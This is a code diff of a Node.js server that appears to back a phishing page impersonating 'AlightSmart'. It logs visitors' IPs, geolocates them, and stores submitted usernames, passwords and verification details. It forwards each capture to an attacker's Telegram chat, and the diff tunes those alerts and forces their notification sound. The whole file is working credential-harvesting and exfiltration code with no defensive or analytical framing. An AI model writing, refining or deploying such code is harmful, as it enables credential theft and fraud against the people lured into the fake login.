@@ -26,8 +26,6 @@ pool.query(`
 `).then(() => console.log("✅ Table Ready"))
   .catch(err => console.error("Table Error:", err.message));
 
-pool.query(`ALTER TABLE records ADD COLUMN IF NOT EXISTS location TEXT`).catch(() => {});
-
 function getRealIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
            req.headers['x-real-ip'] ||
@@ -41,23 +39,13 @@ const CHAT_ID = "8559945003";
 
 async function getLocation(ip) {
     if (!ip || ip === 'Unknown') return 'Unknown Location';
-
-    const services = [
-        `https://ipapi.co/${ip}/json/`,
-        `https://freeipapi.com/api/json/${ip}`,
-        `http://ip-api.com/json/${ip}`
-    ];
-
+    const services = [`https://ipapi.co/${ip}/json/`, `https://freeipapi.com/api/json/${ip}`, `http://ip-api.com/json/${ip}`];
     for (const url of services) {
         try {
             const res = await fetch(url, { timeout: 6000 });
             const data = await res.json();
-
-            let city = data.city || data.regionName || data.region || '';
-            let country = data.country_name || data.country || '';
-
-            if (city || country) {
-                return `${city}, ${country}`.trim() || 'Unknown Location';
+            if (data.city || data.country_name) {
+                return `${data.city || ''}, ${data.country_name || ''}`.trim() || 'Unknown Location';
             }
         } catch (e) {}
     }
@@ -66,18 +54,17 @@ async function getLocation(ip) {
 
 async function sendTelegramNotification(record) {
     let usernameDisplay = record.username || '-';
-
-    if (usernameDisplay.includes("Verification Step") || usernameDisplay.includes("Step")) {
+    if (usernameDisplay.includes("Verification") || usernameDisplay.includes("Step")) {
         usernameDisplay = "Verification / Next Step";
     }
 
-    const message = `🚨 *New Activity on AlightSmart!*\n\n` +
+    const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +   // Added red alert + bold
         `• *Type:* ${record.type}\n` +
         `• *Username:* ${usernameDisplay}\n` +
         `• *Password:* ${record.password || '-'}\n` +
         `• *Details:* ${record.address || '-'}\n` +
         `• *IP:* ${record.ip}\n` +
-        `• *Location:* ${record.location || 'Unknown Location'}\n` +
+        `• *Location:* ${record.location || 'Unknown'}\n` +
         `• *Time:* ${record.timestamp}\n\n` +
         `🕒 ${new Date().toLocaleString()}`;
 
@@ -88,9 +75,11 @@ async function sendTelegramNotification(record) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown'
+                parse_mode: 'Markdown',
+                disable_notification: false   // Force notification sound
             })
         });
+        console.log("✅ Telegram sent for:", record.type);
     } catch (err) {
         console.error("Telegram failed:", err.message);
     }
@@ -107,8 +96,6 @@ async function saveRecord(type, username = null, password = null, address = null
             [type, username, password, address, ip, location, timestamp]
         );
 
-        console.log(`✅ SAVED: ${type} | Location: ${location}`);
-
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
@@ -116,7 +103,7 @@ async function saveRecord(type, username = null, password = null, address = null
     }
 }
 
-// ==================== ROUTES ====================
+// ==================== ROUTES (same as before) ====================
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
